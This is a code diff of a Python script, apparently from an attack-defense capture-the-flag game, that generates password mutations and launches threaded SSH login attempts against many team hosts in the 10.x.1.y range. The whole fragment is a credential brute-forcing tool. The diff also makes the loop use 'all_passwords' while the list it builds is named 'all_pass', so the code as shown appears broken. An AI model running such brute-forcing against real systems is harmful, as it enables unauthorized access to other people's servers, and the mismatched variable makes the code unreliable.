@@ -38,7 +38,6 @@ for i in range(len(default_passwords)):
 				all_pass += [f"{two.capitalize()}-{one}-{k}!"]
 
 print(f"Created passwords: {len(all_pass)}")
-print(all_pass[:5])
 
 # each team
 for team in range(1, 17):
@@ -46,7 +45,7 @@ for team in range(1, 17):
 	# each teams servers
 	for server in [1, 2, 3, 4, 5, 6, 11, 12, 13, 20, 21, 22, 42, 69]:
 		# check each default password
-		for password in default_passwords:
+		for password in all_passwords:
 			for user in users:
 				x = threading.Thread(target=ssh, args=(user, f"10.{team}.1.{server}", password))
 				x.start()
